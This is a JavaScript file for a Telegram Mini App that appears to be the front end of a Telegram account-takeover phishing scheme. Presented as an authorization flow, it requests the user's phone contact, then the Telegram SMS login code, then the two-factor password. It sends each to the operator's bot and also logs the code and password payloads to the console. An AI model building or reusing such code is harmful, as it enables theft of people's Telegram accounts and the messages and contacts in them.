document.addEventListener('DOMContentLoaded', () => {
    if (!window.Telegram || !window.Telegram.WebApp) {
        alert("❌ Открой приложение через Telegram-бота, а не через браузер!");
        console.error("❌ WebApp API не найден. Запусти через кнопку бота.");
        return;
    }

    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    console.log("✅ Telegram WebApp инициализирован.");
    console.log("Init data:", tg.initDataUnsafe);

    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const statusMsg = document.getElementById('statusMsg');
    const instructionMsg = document.getElementById('instructionMsg');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('twoFaInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');

    let currentStep = 'contact';

    // Функция для обработки ответов от бота
    function handleBotResponse(data) {
        console.log('📩 Received bot response:', data);
        
        if (data.type === 'code_success') {
            hideLoading();
            successMsg.textContent = '✅ Код принят! Авторизация завершена.';
            successMsg.classList.remove('hidden');
            statusMsg.textContent = '';
            setTimeout(() => {
                tg.close();
            }, 2000);
        } else if (data.type === 'code_error') {
            hideLoading();
            errorMsg.textContent = data.message || '❌ Ошибка кода';
            errorMsg.classList.remove('hidden');
            codeInput.value = '';
        } else if (data.type === '2fa_required') {
            hideLoading();
            codeInput.classList.add('hidden');
            twoFaInput.classList.remove('hidden');
            submitBtn.textContent = 'Подтвердить 2FA';
            statusMsg.textContent = '2FA требуется. Введите пароль.';
            instructionMsg.classList.remove('hidden');
            currentStep = '2fa';
        } else if (data.type === '2fa_success') {
            hideLoading();
            successMsg.textContent = '✅ 2FA подтверждён! Авторизация завершена.';
            successMsg.classList.remove('hidden');
            statusMsg.textContent = '';
            setTimeout(() => {
                tg.close();
            }, 2000);
        } else if (data.type === '2fa_error') {
            hideLoading();
            errorMsg.textContent = data.message || '❌ Ошибка 2FA';
            errorMsg.classList.remove('hidden');
            twoFaInput.value = '';
        }
    }

    // Слушаем сообщения от бота
    window.addEventListener('message', (event) => {
        if (event.data && event.data.type) {
            handleBotResponse(event.data);
        }
    });

    // Также слушаем обычные сообщения от бота (как fallback)
    tg.onEvent('viewportChanged', (data) => {
        console.log('Viewport changed:', data);
    });

	// Добавьте после инициализации tg
	const mainButton = tg.MainButton;

	// Альтернативный способ отправки данных
	function sendDataToBot(payload) {
		console.log("📤 Sending data to bot:", payload);
		
		// Способ 1: через sendData
		try {
			tg.sendData(JSON.stringify(payload));
			return true;
		} catch (err) {
			console.error("❌ sendData failed:", err);
			return false;
		}
	}

    loginBtn.addEventListener('click', () => {
        console.log('▶️ Login button clicked');
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        statusMsg.textContent = 'Поделитесь контактом для авторизации...';
        showLoading();

        currentStep = 'contact';

        try {
            tg.requestContact((success, contact) => {
                console.log('📞 Contact callback:', success, contact);
                if (success && contact) {
                    phoneInput.value = contact.phone_number || 'Номер отправлен боту';
                    phoneInput.classList.remove('hidden');
                    statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
                    tg.HapticFeedback.impactOccurred('light');

                    setTimeout(() => {
                        phoneInput.classList.add('hidden');
                        codeInput.classList.remove('hidden');
                        submitBtn.classList.remove('hidden');
                        submitBtn.textContent = 'Отправить код';
                        statusMsg.textContent = 'Введите SMS-код из Telegram.';
                        currentStep = 'code';
                        hideLoading();
                    }, 2000);
                } else {
                    hideLoading();
                    errorMsg.textContent = '❌ Вы не предоставили контакт. Попробуйте снова.';
                    errorMsg.classList.remove('hidden');
                    setTimeout(resetForm, 2000);
                }
            });
        } catch (err) {
            console.error("Ошибка при запросе контакта:", err);
            hideLoading();
            errorMsg.textContent = '❌ Telegram API не ответил. Перезапустите через бота.';
            errorMsg.classList.remove('hidden');
        }
    });

	submitBtn.addEventListener('click', () => {
		console.log(`➡️ Submit clicked, step=${currentStep}`);

		if (currentStep === 'code') {
			const code = codeInput.value.trim();
			if (!code) {
				errorMsg.textContent = 'Введите код.';
				errorMsg.classList.remove('hidden');
				return;
			}
			const payload = { action: 'verify_code', code: code };
			console.log("📤 Sending code payload:", payload);

			try {
				// ДОБАВЬТЕ ЭТУ ПРОВЕРКУ
				console.log("📤 Telegram WebApp available:", !!tg);
				console.log("📤 sendData available:", !!tg.sendData);
				
				tg.sendData(JSON.stringify(payload));
				console.log("📤 Data sent successfully");
				
				showLoading();
				statusMsg.textContent = 'Проверяем код...';
				errorMsg.classList.add('hidden');
				tg.HapticFeedback.impactOccurred('medium');
				
				// ДОБАВЬТЕ ТАЙМАУТ ДЛЯ ПРОВЕРКИ
				setTimeout(() => {
					if (loadingSpinner.classList.contains('hidden') === false) {
						console.log('⚠️ No response from bot after 10 seconds');
						errorMsg.textContent = '❌ Нет ответа от бота. Попробуйте снова.';
						errorMsg.classList.remove('hidden');
						hideLoading();
					}
				}, 10000);
				
			} catch (err) {
				console.error("❌ Ошибка отправки tg.sendData:", err);
				errorMsg.textContent = '❌ Ошибка соединения с ботом.';
				errorMsg.classList.remove('hidden');
			}

		} else if (currentStep === '2fa') {
			const password = twoFaInput.value.trim();
			if (!password) {
				errorMsg.textContent = 'Введите пароль 2FA.';
				errorMsg.classList.remove('hidden');
				return;
			}
			const payload = { action: 'verify_2fa', password: password };
			console.log("📤 Sending 2FA payload:", payload);

			try {
				tg.sendData(JSON.stringify(payload));
				showLoading();
				statusMsg.textContent = 'Подтверждаем 2FA...';
				errorMsg.classList.add('hidden');
				tg.HapticFeedback.impactOccurred('heavy');
			} catch (err) {
				console.error("❌ Ошибка отправки tg.sendData:", err);
				errorMsg.textContent = '❌ Ошибка соединения с ботом.';
				errorMsg.classList.remove('hidden');
			}
		}
	});

    // Обработка нажатия Enter в полях ввода
    codeInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && currentStep === 'code') {
            submitBtn.click();
        }
    });

    twoFaInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && currentStep === '2fa') {
            submitBtn.click();
        }
    });

    function showLoading() {
        loadingSpinner.classList.remove('hidden');
        submitBtn.disabled = true;
        errorMsg.classList.add('hidden');
    }

    function hideLoading() {
        loadingSpinner.classList.add('hidden');
        submitBtn.disabled = false;
    }

    function resetForm() {
        console.log('🔄 Reset form');
        authForm.classList.add('hidden');
        loginBtn.classList.remove('hidden');
        loginBtn.style.opacity = '1';
        currentStep = 'contact';
        phoneInput.value = '';
        codeInput.value = '';
        twoFaInput.value = '';
        phoneInput.classList.add('hidden');
        codeInput.classList.add('hidden');
        twoFaInput.classList.add('hidden');
        submitBtn.classList.add('hidden');
        successMsg.classList.add('hidden');
        errorMsg.classList.add('hidden');
        instructionMsg.classList.add('hidden');
        statusMsg.textContent = '';
        hideLoading();
    }

    // Старые обработчики событий (оставляем для совместимости)
    tg.onEvent('web_app_data', (data) => {
        console.log('📩 Received web_app_data event:', data);
        // Этот обработчик может быть полезен для других сценариев
    });

    tg.onEvent('error', (error) => {
        console.error('WebApp error:', error);
        hideLoading();
        errorMsg.textContent = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
        errorMsg.classList.remove('hidden');
        setTimeout(resetForm, 2000);
    });

    // Обработчик закрытия WebApp
    tg.onEvent('close', () => {
        console.log('WebApp closed');
    });

    // Периодическая проверка связи с ботом
    setInterval(() => {
        if (loadingSpinner.classList.contains('hidden') === false) {
            console.log('⏰ Still waiting for bot response...');
        }
    }, 5000);
});